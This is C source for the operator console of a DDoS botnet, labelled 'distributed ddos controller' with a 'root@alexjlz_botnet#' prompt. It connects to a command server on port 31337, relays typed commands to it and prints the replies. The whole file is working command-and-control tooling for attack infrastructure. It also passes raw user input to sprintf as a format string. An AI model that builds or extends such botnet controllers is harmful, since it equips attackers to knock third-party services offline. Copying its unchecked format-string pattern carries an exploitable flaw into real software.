/*
   created at 2015/5/28
   latest modified at 2015/5/28
   distributed ddos controller
 */

#include "tcpip/tcpip.h"
#include "utils/utils.h"
#include "core/core.h"
#include "alg/alexjlz_hash.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/select.h>
#include <readline/readline.h>
#include <readline/history.h>
#include <unistd.h>
#include <errno.h>

int main(int argc, char **argv)
{
    int fd = 0;
    int status = 0;
    int retval = 0;
    fd_set rfds;
    struct timeval tv;

    struct alexjlz_packet p; // alexjlz -> server
    struct alexjlz_packet q; // server -> alexjlz
    int bytes_read = 0;
    int bytes_write = 0;
    fd = connect_tcp_server("127.0.0.1", 31337);

    while (1)
    {
        char * line = readline("root@alexjlz_botnet# ");
        fprintf(stdout, "%s\n", line);
        bzero(&p, sizeof(p));
        sprintf(p.value, line);
        free(line);

        writen(fd, &p, sizeof(p));

        while ( 1 )
        {
            FD_ZERO(&rfds);
            FD_SET(fd, &rfds);
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            retval = 0;

            retval = select(fd+1, &rfds, NULL, NULL, &tv); 
            if ( retval == -1 )  // error
            {
                fprintf(stdout, "Error, select\n");
                fflush(stdout);
                break;
            }
            else if ( retval == 0 )  // timeout
            {
                fprintf(stdout, "cmd process done\n");
                fflush(stdout);
                break;
            }
            else  // data aval
            {
                bytes_read = read(fd, &q, sizeof(q) );
                if ( bytes_read == -1 )
                {
                    fprintf(stderr, "Error: %s\n", strerror(errno)); 
                    exit(-1);
                }
                else if ( bytes_read == sizeof(q) )
                {
                    fprintf(stdout, "%s", q.value);
                    fflush(stdout);
                }
                else
                {
                    fprintf(stdout, "Error, readn not enough bytes:%d\n", bytes_read);
                    fprintf(stdout, "%s\n", q.value);
                    break;
                }
            }
        }
        sleep(3);
    }

    if ( check_fd(fd) )
        close(fd);

    return 0;
}
